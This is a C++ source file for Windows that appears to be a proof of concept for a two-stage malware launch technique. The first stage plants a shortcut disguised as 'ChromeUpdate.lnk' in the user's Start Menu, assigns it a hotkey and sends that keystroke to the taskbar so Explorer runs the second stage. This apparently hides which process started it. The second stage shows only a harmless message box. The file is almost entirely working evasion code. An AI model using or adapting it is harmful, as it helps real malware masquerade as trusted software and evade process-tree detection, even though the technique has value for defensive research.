#include <windows.h>
#include <shlobj.h>
#include <strsafe.h>
#include <cstdio>
#include <cstdlib>

#define STAGE_TWO_STRING L"stage2"
#define STAGE_TWO_STRINGA "stage2"
#define LINK_FILE_NAME L"ChromeUpdate.lnk"
#define LINK_KEY 'Z'

// Helper function to get the path of the current executable
WCHAR* get_current_process_path() {
	WCHAR* buffer = nullptr;
	DWORD buffer_size = MAX_PATH;

	while (true) {
		buffer = static_cast<WCHAR*>(realloc(buffer, buffer_size * sizeof(WCHAR)));
		if (buffer == nullptr) {
			return nullptr;
		}

		const auto result = GetModuleFileName(nullptr, buffer, buffer_size);
		if (result == 0) {
			free(buffer);
			return nullptr;
		}

		// If the result is less than buffer size, we have enough space
		if (result < buffer_size) {
			buffer[result] = 0;
			return buffer;
		}

		// Double buffer size if it's not enough
		buffer_size *= 2;
	}
}

void stage1();
void stage2();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	if (__argc > 1 && strcmp(__argv[1], STAGE_TWO_STRINGA) == 0) {

		stage2();
	}
	else {
		stage1();
	}
	return 0;
}

void stage1() {
	IShellLink* psl = nullptr;
	IPersistFile* ppf = nullptr;
	const LPWSTR target_path = get_current_process_path();

	WCHAR expanded_app_data_path[MAX_PATH]{};
	WCHAR final_path[MAX_PATH]{};

	do {
		// Expand the %AppData% environment variable
		if (const auto result = ExpandEnvironmentStringsW(L"%AppData%", expanded_app_data_path, MAX_PATH); result == 0) {
			// Error handling
			//printf("Failed to expand environment string. Error: %lu\n", GetLastError());
			break;
		}

		// Initialize the final path with the expanded path
		wcscpy_s(final_path, MAX_PATH, expanded_app_data_path);

		auto hr = StringCchCatW(final_path, MAX_PATH, L"\\Microsoft\\Windows\\Start Menu\\");
		if (FAILED(hr)) {
			//printf("Failed to concatenate Start Menu path. Error: 0x%08lx\n", hr);
			return;
		}

		// Concatenate the target lnk file path to the expanded path
		hr = StringCchCatW(final_path, MAX_PATH, LINK_FILE_NAME);
		if (FAILED(hr)) {
			//printf("Failed to concatenate strings. Error: 0x%08lx\n", hr);
			break;
		}

		// Initialize COM library
		auto res = CoInitialize(nullptr);
		if (FAILED(res)) {
			//printf("Failed to initialize COM library. Error: %lx\n", res);
			break;
		}

		// Create an instance of the IShellLink interface
		res = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, reinterpret_cast<void**>(&psl));
		if (FAILED(res)) {
			//printf("Failed to create IShellLink instance. Error: %lx\n", res);
			break;
		}

		// Set the correct path to the target file
		res = psl->SetPath(target_path);
		if (FAILED(res)) {
			//printf("Failed to set path. Error: %lx\n", res);
			break;
		}

		// Set arguments to exec second stage (optional if you implemented other staging control method)
		res = psl->SetArguments(STAGE_TWO_STRING);
		if (FAILED(res)) {
			//printf("Failed to set arguments. Error: %lx\n", res);
			break;
		}

		// Set the hotkey (Ctrl + Shift + What-Ever-Key-You-Chose)
		res = psl->SetHotkey(MAKEWORD(LINK_KEY, HOTKEYF_CONTROL | HOTKEYF_SHIFT));
		if (FAILED(res)) {
			//printf("Failed to set hotkey. Error: %lx\n", res);
			break;
		}

		// Get the IPersistFile interface to save the shortcut
		res = psl->QueryInterface(IID_IPersistFile, reinterpret_cast<void**>(&ppf));
		if (FAILED(res)) {
			//printf("Failed to get IPersistFile interface. Error: %lx\n", res);
			break;
		}

		// Save the shortcut
		res = ppf->Save(final_path, TRUE);
		if (FAILED(res)) {
			break;
		}
		//printf("Shortcut created successfully.\n");

		const auto prev_wnd = GetForegroundWindow();
		const auto explorer_wnd = FindWindow(L"Shell_TrayWnd", nullptr); // "Shell_TrayWnd" is the class name for the task bar
		if (explorer_wnd == nullptr) {
			//OutputDebugStringA("Target window not found.\n");
			return;
		}
		SetForegroundWindow(explorer_wnd);
		//OutputDebugStringA("Calling Shortcut.\n");

		// Simulate the shortcut using SendInput
		INPUT inputs[6]{};

		// Ctrl down
		inputs[0].type = INPUT_KEYBOARD;
		inputs[0].ki.wVk = VK_CONTROL;
		inputs[0].ki.dwFlags = 0;

		// Shift down
		inputs[1].type = INPUT_KEYBOARD;
		inputs[1].ki.wVk = VK_SHIFT;
		inputs[1].ki.dwFlags = 0;

		// Shortcut-key down
		inputs[2].type = INPUT_KEYBOARD;
		inputs[2].ki.wVk = LINK_KEY;
		inputs[2].ki.dwFlags = 0;

		// Shortcut-key up
		inputs[3].type = INPUT_KEYBOARD;
		inputs[3].ki.wVk = LINK_KEY;
		inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;

		// Shift up
		inputs[4].type = INPUT_KEYBOARD;
		inputs[4].ki.wVk = VK_SHIFT;
		inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

		// Ctrl up
		inputs[5].type = INPUT_KEYBOARD;
		inputs[5].ki.wVk = VK_CONTROL;
		inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

		// Send the input
		SendInput(6, inputs, sizeof(INPUT));

		if (prev_wnd != nullptr) {
			SetForegroundWindow(prev_wnd);
		}
	} while (false);


	if (target_path != nullptr) free(target_path);
	if (ppf) ppf->Release();
	if (psl) psl->Release();
	CoUninitialize();
}

void stage2() {
	// Just some arbitrary code to showcase that the PoC works.

	const auto user32 = LoadLibraryA("user32.dll");
	if (user32 == nullptr) return;

	const auto p_message_box_a = reinterpret_cast<decltype(&MessageBoxA)>(GetProcAddress(user32, "MessageBoxA"));
	if (p_message_box_a == nullptr) {
		FreeLibrary(user32);
		return;
	}

	p_message_box_a(nullptr, "Check process info", "Hey There!", MB_OK | MB_ICONINFORMATION);

	FreeLibrary(user32);
}
